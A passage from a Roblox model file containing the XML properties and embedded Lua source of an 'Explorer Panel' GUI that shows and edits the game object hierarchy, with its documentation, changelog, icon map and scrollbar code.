								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
					<Item class="BindableFunction" referent="RBX175107E5822447B4B7AB0D58848C639A">
						<Properties>
							<string name="Name">GetApi</string>
						</Properties>
					</Item>
					<Item class="BindableFunction" referent="RBX30B18032B8264E969CBF48AE3E5B718A">
						<Properties>
							<string name="Name">GetAwaiting</string>
						</Properties>
					</Item>
					<Item class="BindableEvent" referent="RBX2381951DC7534A57B4734B505D55A47D">
						<Properties>
							<string name="Name">SetAwaiting</string>
						</Properties>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX1E1EBC45FEF5493B9F6F399CE81D77E8">
					<Properties>
						<bool name="Active">false</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4294967295</Color3>
						<float name="BackgroundTransparency">0.100000001</float>
						<Color3 name="BorderColor3">4290756543</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">ExplorerPanel</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>0</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>300</XO>
							<YS>0.5</YS>
							<YO>0</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">true</bool>
						<int name="ZIndex">1</int>
					</Properties>
					<Item class="BindableEvent" referent="RBXFBC1064B880142E1AC1FA1E9C7297A5C">
						<Properties>
							<string name="Name">SelectionChanged</string>
						</Properties>
					</Item>
					<Item class="BindableFunction" referent="RBX768D258E081B4192807B2DC30C13D648">
						<Properties>
							<string name="Name">SetOption</string>
						</Properties>
					</Item>
					<Item class="BindableFunction" referent="RBX404CE28084BF4922A092458F19C30806">
						<Properties>
							<string name="Name">SetSelection</string>
						</Properties>
					</Item>
					<Item class="BindableFunction" referent="RBX44474371D940489884EE25AD22EC2D57">
						<Properties>
							<string name="Name">GetOption</string>
						</Properties>
					</Item>
					<Item class="BindableFunction" referent="RBX2B905F07705A4271A6E8F4EAF23FD4E8">
						<Properties>
							<string name="Name">GetSelection</string>
						</Properties>
					</Item>
					<Item class="LocalScript" referent="RBX865139FD868542D787680F2F31D7E025">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">LocalScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[-- initial states
local Option = {
	-- can modify object parents in the hierarchy
	Modifiable = false;
	-- can select objects
	Selectable = true;
}

-- MERELY

Option.Modifiable = true

-- END MERELY

-- general size of GUI objects, in pixels
local GUI_SIZE = 16
-- padding between items within each entry
local ENTRY_PADDING = 1
-- padding between each entry
local ENTRY_MARGIN = 1

local Input = game:GetService("UserInputService")
local HoldingCtrl = false
local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

		Whether objects can be selected.

		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
local HEADER_SIZE = ENTRY_SIZE*2

local FONT = 'SourceSans'
local FONT_SIZE do
	local size = {8,9,10,11,12,14,18,24,36,48}
	local s
	local n = math.huge
	for i = 1,#size do
		if size[i] <= GUI_SIZE then
			FONT_SIZE = i - 1
		end
	end
end

local GuiColor = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 96/255, 140/255, 211/255);
	BorderSelected  = Color3.new( 86/255, 125/255, 188/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Icon map constants

local MAP_ID = 483448923

-- Indices based on implementation of Icon function.
local ACTION_CUT         	 = 160
local ACTION_COPY        	 = 161
local ACTION_PASTE       	 = 162
local ACTION_DELETE      	 = 163
local ACTION_SORT        	 = 164
local ACTION_CUT_OVER    	 = 174
local ACTION_COPY_OVER   	 = 175
local ACTION_PASTE_OVER  	 = 176
local ACTION_DELETE_OVER	 = 177
local ACTION_SORT_OVER  	 = 178
local ACTION_EDITQUICKACCESS = 190
local ACTION_FREEZE 		 = 188
local ACTION_STARRED 		 = 189
local ACTION_ADDSTAR 		 = 184
local ACTION_ADDSTAR_OVER 	 = 187

local NODE_COLLAPSED      = 165
local NODE_EXPANDED       = 166
local NODE_COLLAPSED_OVER = 179
local NODE_EXPANDED_OVER  = 180

local ExplorerIndex = {
	["Accessory"] = 32;
	["Accoutrement"] = 32;
	["AdService"] = 73;
	["Animation"] = 60;
	["AnimationController"] = 60;
	["AnimationTrack"] = 60;
	["Animator"] = 60;
	["ArcHandles"] = 56;
	["AssetService"] = 72;
	["Attachment"] = 34;
	["Backpack"] = 20;
	["BadgeService"] = 75;
	["BallSocketConstraint"] = 89;
	["BillboardGui"] = 64;
	["BinaryStringValue"] = 4;
	["BindableEvent"] = 67;
	["BindableFunction"] = 66;
	["BlockMesh"] = 8;
	["BloomEffect"] = 90;
	["BlurEffect"] = 90;
	["BodyAngularVelocity"] = 14;
	["BodyForce"] = 14;
	["BodyGyro"] = 14;
	["BodyPosition"] = 14;
	["BodyThrust"] = 14;
	["BodyVelocity"] = 14;
	["BoolValue"] = 4;
	["BoxHandleAdornment"] = 54;
	["BrickColorValue"] = 4;
	["Camera"] = 5;
	["CFrameValue"] = 4;
	["CharacterMesh"] = 60;
	["Chat"] = 33;
	["ClickDetector"] = 41;
	["CollectionService"] = 30;
	["Color3Value"] = 4;
	["ColorCorrectionEffect"] = 90;
	["ConeHandleAdornment"] = 54;
	["Configuration"] = 58;
	["ContentProvider"] = 72;
	["ContextActionService"] = 41;
	["CoreGui"] = 46;
	["CoreScript"] = 18;
	["CornerWedgePart"] = 1;
	["CustomEvent"] = 4;
	["CustomEventReceiver"] = 4;
	["CylinderHandleAdornment"] = 54;
	["CylinderMesh"] = 8;
	["CylindricalConstraint"] = 89;
	["Debris"] = 30;
	["Decal"] = 7;
	["Dialog"] = 62;
	["DialogChoice"] = 63;
	["DoubleConstrainedValue"] = 4;
	["Explosion"] = 36;
	["FileMesh"] = 8;
	["Fire"] = 61;
	["Flag"] = 38;
	["FlagStand"] = 39;
	["FloorWire"] = 4;
	["Folder"] = 70;
	["ForceField"] = 37;
	["Frame"] = 48;
	["GamePassService"] = 19;
	["Glue"] = 34;
	["GuiButton"] = 52;
	["GuiMain"] = 47;
	["GuiService"] = 47;
	["Handles"] = 53;
	["HapticService"] = 84;
	["Hat"] = 45;
	["HingeConstraint"] = 89;
	["Hint"] = 33;
	["HopperBin"] = 22;
	["HttpService"] = 76;
	["Humanoid"] = 9;
	["ImageButton"] = 52;
	["ImageLabel"] = 49;
	["InsertService"] = 72;
	["IntConstrainedValue"] = 4;
	["IntValue"] = 4;
	["JointInstance"] = 34;
	["JointsService"] = 34;
	["Keyframe"] = 60;
	["KeyframeSequence"] = 60;
	["KeyframeSequenceProvider"] = 60;
	["Lighting"] = 13;
	["LineHandleAdornment"] = 54;
	["LocalScript"] = 18;
	["LogService"] = 87;
	["MarketplaceService"] = 46;
	["Message"] = 33;
	["Model"] = 2;
	["ModuleScript"] = 71;
	["Motor"] = 34;
	["Motor6D"] = 34;
	["MoveToConstraint"] = 89;
	["NegateOperation"] = 78;
	["NetworkClient"] = 16;
	["NetworkReplicator"] = 29;
	["NetworkServer"] = 15;
	["NumberValue"] = 4;
	["ObjectValue"] = 4;
	["Pants"] = 44;
	["ParallelRampPart"] = 1;
	["Part"] = 1;
	["ParticleEmitter"] = 69;
	["PartPairLasso"] = 57;
	["PathfindingService"] = 37;
	["Platform"] = 35;
	["Player"] = 12;
	["PlayerGui"] = 46;
	["Players"] = 21;
	["PlayerScripts"] = 82;
	["PointLight"] = 13;
	["PointsService"] = 83;
	["Pose"] = 60;
	["PrismaticConstraint"] = 89;
	["PrismPart"] = 1;
	["PyramidPart"] = 1;
	["RayValue"] = 4;
	["ReflectionMetadata"] = 86;
	["ReflectionMetadataCallbacks"] = 86;
	["ReflectionMetadataClass"] = 86;
	["ReflectionMetadataClasses"] = 86;
	["ReflectionMetadataEnum"] = 86;
	["ReflectionMetadataEnumItem"] = 86;
	["ReflectionMetadataEnums"] = 86;
	["ReflectionMetadataEvents"] = 86;
	["ReflectionMetadataFunctions"] = 86;
	["ReflectionMetadataMember"] = 86;
	["ReflectionMetadataProperties"] = 86;
	["ReflectionMetadataYieldFunctions"] = 86;
	["RemoteEvent"] = 80;
	["RemoteFunction"] = 79;
	["ReplicatedFirst"] = 72;
	["ReplicatedStorage"] = 72;
	["RightAngleRampPart"] = 1;
	["RocketPropulsion"] = 14;
	["RodConstraint"] = 89;
	["RopeConstraint"] = 89;
	["Rotate"] = 34;
	["RotateP"] = 34;
	["RotateV"] = 34;
	["RunService"] = 66;
	["ScreenGui"] = 47;
	["Script"] = 6;
	["ScrollingFrame"] = 48;
	["Seat"] = 35;
	["Selection"] = 55;
	["SelectionBox"] = 54;
	["SelectionPartLasso"] = 57;
	["SelectionPointLasso"] = 57;
	["SelectionSphere"] = 54;
	["ServerScriptService"] = 0;
	["ServerStorage"] = 74;
	["Shirt"] = 43;
	["ShirtGraphic"] = 40;
	["SkateboardPlatform"] = 35;
	["Sky"] = 28;
	["SlidingBallConstraint"] = 89;
	["Smoke"] = 59;
	["Snap"] = 34;
	["Sound"] = 11;
	["SoundService"] = 31;
	["Sparkles"] = 42;
	["SpawnLocation"] = 25;
	["SpecialMesh"] = 8;
	["SphereHandleAdornment"] = 54;
	["SpotLight"] = 13;
	["SpringConstraint"] = 89;
	["StarterCharacterScripts"] = 82;
	["StarterGear"] = 20;
	["StarterGui"] = 46;
	["StarterPack"] = 20;
	["StarterPlayer"] = 88;
	["StarterPlayerScripts"] = 82;
	["Status"] = 2;
	["StringValue"] = 4;
	["SunRaysEffect"] = 90;
	["SurfaceGui"] = 64;
	["SurfaceLight"] = 13;
	["SurfaceSelection"] = 55;
	["Team"] = 24;
	["Teams"] = 23;
	["TeleportService"] = 81;
	["Terrain"] = 65;
	["TerrainRegion"] = 65;
	["TestService"] = 68;
	["TextBox"] = 51;
	["TextButton"] = 51;
	["TextLabel"] = 50;
	["Texture"] = 10;
	["TextureTrail"] = 4;
	["Tool"] = 17;
	["TouchTransmitter"] = 37;
	["TrussPart"] = 1;
	["UnionOperation"] = 77;
	["UserInputService"] = 84;
	["Vector3Value"] = 4;
	["VehicleSeat"] = 35;
	["VelocityMotor"] = 34;
	["WedgePart"] = 1;
	["Weld"] = 34;
	["Workspace"] = 19;
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end

local barActive = false
local activeOptions = {}

function createDDown(dBut, callback,...)
	if barActive then
		for i,v in pairs(activeOptions) do
			v:Destroy()
		end
		activeOptions = {}
		barActive = false
		return
	else
		barActive = true
	end
	local slots = {...}
	local base = dBut
	for i,v in pairs(slots) do
		local newOption = base:Clone()
		newOption.ZIndex = 5
		newOption.Name = "Option "..tostring(i)
		newOption.Parent = base.Parent.Parent.Parent
		newOption.BackgroundTransparency = 0
		newOption.ZIndex = 2
		table.insert(activeOptions,newOption)
		newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
		newOption.Text = slots[i]
		newOption.MouseButton1Down:connect(function()
			dBut.Text = slots[i]
			callback(slots[i])
			for i,v in pairs(activeOptions) do
				v:Destroy()
			end
			activeOptions = {}
			barActive = false
		end)
	end
end

-- Connects a function to an event such that it fires asynchronously
function Connect(event,func)
	return event:connect(function(...)
		local a = {...}
		spawn(function() func(unpack(a)) end)
	end)
end

-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end

do
	local ZIndexLock = {}
	-- Sets the ZIndex of an object and its descendants. Objects are locked so
	-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
	-- ZIndex of the same object.
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end

	function SetZIndexOnChanged(object)
		return object.Changed:connect(function(p)
			if p == "ZIndex" then
				SetZIndex(object,object.ZIndex)
			end
		end)
	end
end

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.mulrbx.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- ScrollBar
do
	-- AutoButtonColor doesn't always reset properly
	local function ResetButtonColor(button)
		local active = button.Active
		button.Active = not active
		button.Active = active
	end

	local function ArrowGraphic(size,dir,scaled,template)
		local Frame = Create('Frame',{
			Name = "Arrow Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size,0,size);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		local transform
		if dir == nil or dir == 'Up' then
			function transform(p,s) return p,s end
		elseif dir == 'Down' then
			function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
		elseif dir == 'Left' then
			function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		elseif dir == 'Right' then
			function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		end

		local scale
		if scaled then
			function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
		else
			function scale(p,s) return p,s end
		end

		local o = math.floor(size/4)
		if size%2 == 0 then
			local n = size/2-1
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,(i+1)*2,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		else
			local n = (size-1)/2
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,i*2+1,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		end
		if size%4 > 1 then
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,0,0,size-o-1),
				UDim2.new(0,size,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
		return Frame
	end


	local function GripGraphic(size,dir,spacing,scaled,template)
		local Frame = Create('Frame',{
			Name = "Grip Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size.x,0,size.y);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		spacing = spacing or 2

		local scale
		if scaled then
			function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
		else
			function scale(p) return p end
		end

		if dir == 'Vertical' then
			for i=0,size.x-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,1,0,size.y))
				t.Position = scale(UDim2.new(0,i,0,0))
				t.Parent = Frame
			end
		elseif dir == nil or dir == 'Horizontal' then
			for i=0,size.y-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,size.x,0,1))
				t.Position = scale(UDim2.new(0,0,0,i))
				t.Parent = Frame
			end
		end

		return Frame
	end

	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-GUI_SIZE) or UDim2.new(1,-GUI_SIZE,0,0);
			Size = horizontal and UDim2.new(1,0,0,GUI_SIZE) or UDim2.new(0,GUI_SIZE,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-GUI_SIZE,0,0) or UDim2.new(0,0,1,-GUI_SIZE);
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-GUI_SIZE*2,1,0) or UDim2.new(1,0,1,-GUI_SIZE*2);
				Position = horizontal and UDim2.new(0,GUI_SIZE,0,0) or UDim2.new(0,0,0,GUI_SIZE);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
					BackgroundColor3 = GuiColor.Button;
					BorderColor3 = GuiColor.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = GuiColor.Border;
		})
		local graphicSize = GUI_SIZE/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = GUI_SIZE*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
				if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
